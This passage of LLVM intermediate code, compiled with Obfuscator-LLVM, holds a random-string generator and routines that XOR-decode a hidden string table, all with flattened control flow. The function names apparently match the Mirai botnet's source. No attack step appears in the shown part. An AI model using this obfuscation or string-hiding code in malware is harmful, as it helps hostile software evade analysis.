  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -811375903, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -811375903, label %5
    i32 -1335096891, label %9
    i32 -1922051118, label %13
    i32 -1147700238, label %23
    i32 889556804, label %27
    i32 614774191, label %39
    i32 1510955625, label %47
    i32 -39134675, label %48
    i32 215910261, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 -1335096891, i32 215910261
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 -1922051118, i32 -1147700238
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 -39134675, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 889556804, i32 614774191
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 1510955625, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 1510955625, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -39134675, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -811375903, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1292350971, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1292350971, label %27
    i32 -297895912, label %35
    i32 1420282754, label %84
    i32 1213591704, label %87
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  %34 = select i1 %33, i32 -297895912, i32 1213591704
  store i32 %34, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i32
  %38 = load %struct.table_value*, %struct.table_value** %4, align 8
  %39 = getelementptr inbounds %struct.table_value, %struct.table_value* %38, i32 0, i32 0
  %40 = load i8*, i8** %39, align 8
  %41 = load i32, i32* %3, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8, i8* %40, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = xor i32 %45, %37
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %43, align 1
  %48 = load i8, i8* %6, align 1
  %49 = zext i8 %48 to i32
  %50 = load %struct.table_value*, %struct.table_value** %4, align 8
  %51 = getelementptr inbounds %struct.table_value, %struct.table_value* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = xor i32 %57, %49
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %55, align 1
  %60 = load i8, i8* %7, align 1
  %61 = zext i8 %60 to i32
  %62 = load %struct.table_value*, %struct.table_value** %4, align 8
  %63 = getelementptr inbounds %struct.table_value, %struct.table_value* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i8, i8* %67, align 1
  %69 = sext i8 %68 to i32
  %70 = xor i32 %69, %61
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %67, align 1
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i32
  %74 = load %struct.table_value*, %struct.table_value** %4, align 8
  %75 = getelementptr inbounds %struct.table_value, %struct.table_value* %74, i32 0, i32 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i32, i32* %3, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = xor i32 %81, %73
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %79, align 1
  store i32 1420282754, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 -1292350971, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 -1290277935, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1290277935, label %first
    i32 -659737934, label %12
    i32 -1151775620, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 -659737934, i32 -1151775620
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 -1151775620, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readnone }
attributes #9 = { noreturn nounwind }
attributes #10 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
